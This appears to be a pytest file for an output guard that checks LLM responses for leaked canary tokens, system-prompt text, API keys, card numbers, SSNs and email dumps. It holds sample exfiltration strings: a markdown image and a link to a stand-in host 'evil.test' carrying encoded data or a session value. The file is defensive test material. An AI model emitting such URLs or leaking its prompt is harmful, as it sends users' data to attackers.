from pi_guard.output_guard import OutputGuard, luhn_valid, make_canary, system_prompt_overlap

SYSTEM_PROMPT = (
    "You are SupportBot for Acme Corp. Only answer questions about Acme orders. "
    "Never discuss internal pricing tiers or the escalation phone tree with customers."
)


def test_canary_is_unique_and_detected():
    a, b = make_canary(), make_canary()
    assert a != b and a.startswith("CANARY-")
    result = OutputGuard(canaries=[a]).scan(f"Sure! My instructions say {a}.")
    assert result.leaked and result.worst_severity == "critical"
    assert a not in result.findings[0].detail  # token itself is redacted in the report


def test_clean_output_has_no_findings():
    guard = OutputGuard(canaries=[make_canary()], system_prompt=SYSTEM_PROMPT)
    result = guard.scan("Your order #1234 shipped yesterday and should arrive Friday.")
    assert result.findings == []
    assert result.worst_severity == "none"


def test_system_prompt_verbatim_leak_detected():
    guard = OutputGuard(system_prompt=SYSTEM_PROMPT)
    result = guard.scan("My instructions: You are SupportBot for Acme Corp. Only answer questions "
                        "about Acme orders. Never discuss internal pricing tiers.")
    assert any(f.kind == "system_prompt_leak" for f in result.findings)


def test_overlap_metric_bounds():
    assert system_prompt_overlap("unrelated words entirely here today", SYSTEM_PROMPT) == 0.0
    assert system_prompt_overlap(SYSTEM_PROMPT, SYSTEM_PROMPT) == 1.0
    assert system_prompt_overlap("anything", "too short") == 0.0


def test_secrets_detected_and_redacted():
    aws = "AKIA" + "ABCDEFGHIJKLMNOP"
    gh = "ghp_" + "a" * 36
    result = OutputGuard().scan(f"keys: {aws} and {gh}\n-----BEGIN RSA PRIVATE KEY-----")
    kinds = [f.detail.split(":")[0] for f in result.findings if f.kind == "secret"]
    assert {"aws_access_key_id", "github_token", "private_key_block"} <= set(kinds)
    assert aws not in str(result.to_dict())


def test_luhn():
    assert luhn_valid("4111 1111 1111 1111")
    assert not luhn_valid("4111 1111 1111 1112")
    assert not luhn_valid("1234")


def test_card_and_ssn_pii_detected():
    result = OutputGuard().scan("Card 4111-1111-1111-1111, SSN 123-45-6789")
    details = " ".join(f.detail for f in result.findings)
    assert "payment card" in details and "SSN" in details
    assert "123-45-6789" not in details


def test_pii_checks_can_be_disabled():
    assert OutputGuard(check_pii=False).scan("SSN 123-45-6789").findings == []


def test_bulk_email_dump_flagged_but_single_email_is_not():
    guard = OutputGuard()
    assert guard.scan("Contact help@acme.test").findings == []
    dump = guard.scan("a@x.test, b@x.test, c@x.test")
    assert dump.findings[0].kind == "pii" and dump.findings[0].severity == "medium"


def test_exfil_image_to_unknown_host_is_high():
    result = OutputGuard().scan("Done! ![](https://evil.test/p.gif?d=c2VjcmV0)")
    assert result.leaked
    assert result.findings[0].kind == "exfil_image_url"


def test_allowlisted_image_host_is_ignored():
    guard = OutputGuard(allowed_domains=["acme.test"])
    assert guard.scan("![logo](https://cdn.acme.test/logo.png?v=2)").findings == []


def test_plain_link_without_params_is_fine_but_with_params_is_flagged():
    guard = OutputGuard()
    assert guard.scan("See [docs](https://docs.python.org/3/)").findings == []
    flagged = guard.scan("Click [here](https://evil.test/c?session=abc)")
    assert flagged.findings[0].kind == "suspicious_link"
    assert not flagged.leaked  # medium severity: suspicious, not proof of a leak
